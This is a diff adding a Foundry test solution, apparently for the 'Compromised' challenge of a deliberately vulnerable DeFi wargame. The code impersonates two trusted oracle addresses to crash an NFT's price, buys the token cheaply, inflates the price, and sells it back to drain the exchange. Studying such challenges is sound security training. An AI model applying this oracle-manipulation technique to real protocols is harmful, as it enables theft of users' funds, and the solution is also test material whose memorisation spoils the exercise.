@@ -76,6 +76,29 @@ contract Compromised is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        // lower oracle prices
+        vm.prank(0xA73209FB1a42495120166736362A1DfA9F95A105);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+        // buy an NFT for cheap
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        // increase oracle prices
+        vm.prank(0xA73209FB1a42495120166736362A1DfA9F95A105);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether);
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether);
+        // sell back the NFT for high
+        vm.prank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        vm.prank(attacker);
+        exchange.sellOne(tokenId);
+
+        vm.prank(0xA73209FB1a42495120166736362A1DfA9F95A105);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
 
         /** EXPLOIT END **/
         validation();
